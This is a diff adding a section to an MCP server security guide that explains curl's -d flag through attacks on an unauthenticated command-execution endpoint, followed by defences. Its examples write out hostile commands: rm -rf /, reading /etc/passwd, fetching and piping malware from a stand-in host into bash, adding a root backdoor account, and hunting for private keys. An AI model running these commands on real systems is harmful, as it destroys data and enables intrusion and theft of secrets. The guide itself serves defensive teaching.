@@ -669,6 +669,176 @@ This is why:
 
 **Remember: Convenience is the enemy of security. Always be explicit about network exposure.**
 
+### Understanding Attack Commands: The `-d` Flag in curl
+
+Many of the attack examples in this document use curl with the `-d` flag. Understanding what this flag does is crucial for comprehending the security risks:
+
+#### What the `-d` Flag Does
+
+The `-d` flag in curl stands for "**data**" and is used to send HTTP POST data in the request body:
+
+```bash
+curl http://127.0.0.1:3000/execute -d '{"command": "rm -rf /"}'
+     ↑                                ↑
+     |                                └── POST data (JSON payload)
+     └── Target URL
+```
+
+#### Technical Breakdown
+
+1. **HTTP Method**: `-d` automatically changes the request from GET to POST
+2. **Content-Type**: Sets `Content-Type: application/x-www-form-urlencoded` by default
+3. **Request Body**: Places the data in the HTTP request body
+4. **JSON Data**: The string becomes the POST payload sent to the server
+
+#### The HTTP Request Generated
+
+```http
+POST /execute HTTP/1.1
+Host: 127.0.0.1:3000
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+{"command": "rm -rf /"}
+```
+
+#### What `rm -rf /` Actually Does
+
+This is one of the most destructive commands possible on Unix/Linux systems:
+
+- `rm` = remove/delete command
+- `-r` = recursive (delete directories and all their contents)
+- `-f` = force (don't prompt for confirmation, ignore nonexistent files)
+- `/` = root directory (the entire filesystem)
+
+**Translation**: "Delete everything on the system without asking for confirmation"
+
+#### Real-World Impact of This Attack
+
+If an MCP server executes this command, the results are catastrophic:
+
+- **Operating System**: Completely destroyed
+- **All Applications**: Deleted permanently
+- **User Data**: Gone forever (documents, databases, configurations)
+- **System Recovery**: Impossible without complete restoration from backups
+- **Server Status**: Completely bricked and unusable
+- **Business Impact**: Complete system downtime, potential data loss
+
+#### Other Dangerous Commands via `-d`
+
+```bash
+# Exfiltrate sensitive data
+curl -d '{"command": "cat /etc/passwd"}' http://127.0.0.1:3000/execute
+
+# Download and execute malware
+curl -d '{"command": "curl malicious-site.com/malware.sh | bash"}' url
+
+# Create backdoor access
+curl -d '{"command": "echo \"hacker::0:0::/root:/bin/bash\" >> /etc/passwd"}' url
+
+# Steal environment variables (often contain secrets)
+curl -d '{"command": "env"}' http://127.0.0.1:3000/execute
+
+# Access private keys
+curl -d '{"command": "find /home -name \"*.key\" -o -name \"id_rsa\""}' url
+```
+
+#### Other curl `-d` Flag Variations
+
+```bash
+# Send JSON with proper content-type
+curl -d '{"key": "value"}' -H "Content-Type: application/json" url
+
+# Send form data
+curl -d "username=admin&password=secret" url
+
+# Send from file
+curl -d @malicious-payload.json url
+
+# Multiple data parameters
+curl -d "field1=value1" -d "field2=value2" url
+
+# URL encode data
+curl -d "message=hello%20world" url
+```
+
+#### Why These Examples Are So Effective
+
+1. **No Authentication**: Most development MCP servers have no authentication
+2. **Full Privileges**: MCP servers often run with the same privileges as the user
+3. **Direct Execution**: Commands execute immediately without validation
+4. **No Logging**: Many servers don't log incoming commands
+5. **Network Accessible**: `-p 3000:3000` makes them reachable from anywhere
+
+#### The Security Lesson
+
+The `-d` flag itself is completely innocent - it's just a way to send data with HTTP POST requests. The danger comes from:
+
+1. **Unsecured Endpoints**: Servers that execute any command without validation
+2. **Network Exposure**: Making these endpoints accessible over the network
+3. **Lack of Input Validation**: Not sanitizing or restricting incoming commands
+4. **Missing Authentication**: No verification of who is sending commands
+5. **Excessive Privileges**: Running servers with unnecessary system access
+
+#### Defense Against These Attacks
+
+**1. Never Expose Command Execution Endpoints**
+```bash
+# DON'T create endpoints like:
+/execute
+/command
+/run
+/shell
+```
+
+**2. Use Whitelisted Operations Instead**
+```json
+{
+  "allowed_operations": [
+    "get_status",
+    "list_files",
+    "read_config"
+  ],
+  "blocked_operations": ["execute", "command", "shell"]
+}
+```
+
+**3. Input Validation and Sanitization**
+```javascript
+// Validate incoming data
+if (data.command.includes('rm -rf')) {
+  throw new Error('Destructive command blocked');
+}
+
+// Use command whitelists
+const allowedCommands = ['git status', 'npm version'];
+if (!allowedCommands.includes(data.command)) {
+  throw new Error('Command not allowed');
+}
+```
+
+**4. Run with Minimal Privileges**
+```bash
+# Create restricted user
+useradd --no-create-home --shell /bin/false mcp-user
+
+# Run server as restricted user
+sudo -u mcp-user node mcp-server.js
+```
+
+**5. Use Stdio Mode (Eliminates Network Attacks)**
+```bash
+# SAFE - No network exposure possible
+npx @modelcontextprotocol/server-name
+
+# DANGEROUS - Network exposed
+npx @modelcontextprotocol/server-name --port 3000
+```
+
+#### Key Takeaway
+
+**The `-d` flag is just the delivery mechanism. The real danger is having network-accessible endpoints that execute arbitrary commands without proper security controls.** This is why stdio mode is strongly recommended for MCP servers - it eliminates the entire network attack surface.
+
 ## Key Takeaways
 
 ### Semtools
